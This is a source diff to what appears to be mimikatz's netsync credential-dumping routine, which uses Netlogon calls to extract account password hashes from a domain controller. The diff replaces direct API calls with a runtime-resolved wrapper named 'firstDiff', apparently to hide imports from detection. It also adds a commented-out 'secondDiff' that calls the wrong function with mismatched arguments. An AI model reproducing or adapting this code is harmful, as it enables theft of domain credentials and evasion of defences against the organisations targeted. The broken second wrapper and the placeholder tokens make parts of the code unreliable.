@@ -2034,7 +2034,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 				if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
 				{
 					//kprintf(L"> ClientChallenge          : "); kull_m_string_wprintf_hex(ClientChallenge.data, sizeof(ClientChallenge.data), 0); kprintf(L"\n");
-					status = [65]((LOGONSRV_HANDLE) szDc, (wchar_t *) szComputer, &ClientChallenge, &ServerChallenge);
+					status = firstDiff((LOGONSRV_HANDLE) szDc, (wchar_t *) szComputer, &ClientChallenge, &ServerChallenge);
 					if(NT_SUCCESS(status))
 					{
 						//kprintf(L"< ServerChallenge          : "); kull_m_string_wprintf_hex(ServerChallenge.data, sizeof(ServerChallenge.data), 0); kprintf(L"\n");
@@ -2051,7 +2051,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 							//kprintf(L"> ClientCredential         : "); kull_m_string_wprintf_hex(ClientCredential.data, sizeof(ClientCredential.data), 0); kprintf(L"\n");
 							//kprintf(L"> CandidateServerCredential: "); kull_m_string_wprintf_hex(CandidateServerCredential.data, sizeof(CandidateServerCredential.data), 0); kprintf(L"\n");
 							//kprintf(L"> NegotiateFlags           : 0x%08x\n", NegotiateFlags);
-							status = [59]((LOGONSRV_HANDLE) szDc, (wchar_t *) szUser, ServerSecureChannel, (wchar_t *) szComputer, &ClientCredential, &ServerCredential, &NegotiateFlags);
+							status = I_NetServerAuthenticate2((LOGONSRV_HANDLE) szDc, (wchar_t *) szUser, ServerSecureChannel, (wchar_t *) szComputer, &ClientCredential, &ServerCredential, &NegotiateFlags);
 							if(NT_SUCCESS(status))
 							{
 								//kprintf(L"< ServerCredential         : "); kull_m_string_wprintf_hex(ServerCredential.data, sizeof(ServerCredential.data), 0); kprintf(L"\n");
@@ -2062,7 +2062,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 									{
 										kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(&ClientCredential, 0x10, &ClientAuthenticator, sessionKey);
 										//kprintf(L"> ClientAuthenticator (%u)  : ", kuhl_m_lsadump_netsync_sc[i]); kull_m_string_wprintf_hex(ClientAuthenticator.Credential.data, sizeof(ClientAuthenticator.Credential.data), 0); kprintf(L" (%u - 0x%08x)\n", ClientAuthenticator.Timestamp, ClientAuthenticator.Timestamp);
-										status = [62]((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
+										status = I_NetServerTrustPasswordsGet((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
 										if(NT_SUCCESS(status))
 										{
 											kprintf(L"  Account: %s\n", szAccount);
@@ -2078,14 +2078,14 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 										*(PDWORD64) ClientCredential.data += 1; // lol :) validate server auth
 									}
 									if(!NT_SUCCESS(status))
-										PRINT_ERROR(L"[62] (0x%08x)\n", status);
+										PRINT_ERROR(L"I_NetServerTrustPasswordsGet (0x%08x)\n", status);
 								}
 								else PRINT_ERROR(L"ServerCredential does not match CandidateServerCredential\n");
 							}
-							else PRINT_ERROR(L"[59] (0x%08x)\n", status);
+							else PRINT_ERROR(L"I_NetServerAuthenticate2 (0x%08x)\n", status);
 						}
 					}
-					else PRINT_ERROR(L"[65] (0x%08x)\n", status);
+					else PRINT_ERROR(L"firstDiff (0x%08x)\n", status);
 				}
 				else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
 			}
@@ -2618,3 +2618,31 @@ NTSTATUS kuhl_m_lsadump_update_dc_password(int argc, wchar_t * argv[])
 
 	return STATUS_SUCCESS;
 }
+
+NTSTATUS __stdcall firstDiff(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t* ComputerName, IN PNETLOGON_CREDENTIAL ClientChallenge, OUT PNETLOGON_CREDENTIAL ServerChallenge)
+{
+	NTSTATUS status;
+	__firstDiffProc l_myProc = NULL;
+	l_myProc = (__firstDiffProc)GetProcAddress(
+		GetModuleHandle(TEXT("netapi32.dll")),
+		"I_NetServerReqChallenge");
+	if (NULL != l_myProc) {
+		status = (l_myProc)(PrimaryName, ComputerName, ClientChallenge, ServerChallenge);
+	}
+	return status;
+}
+/*
+NTSTATUS __stdcall secondDiff(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t* AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t* ComputerName, IN PNETLOGON_CREDENTIAL ClientCredential, OUT PNETLOGON_CREDENTIAL ServerCredential, IN OUT ULONG* NegotiateFlags)
+{
+//	HINSTANSE hDLL = LoadLibrary("netapi32.dll");
+//	WINAPI *pGNSI;
+	NTSTATUS status;
+	__firstDiffProc l_myProc = NULL;
+	l_myProc  =  (__firstDiffProc) GetProcAddress(
+		GetModuleHandle(TEXT("netapi32.dll")),
+		"I_NetServerReqChallenge");
+	if (NULL != l_myProc) {
+		status = (l_myProc) (PrimaryName, AccountName, SecureChannelType, ServerCredential);
+	}
+	return status;
+}*/
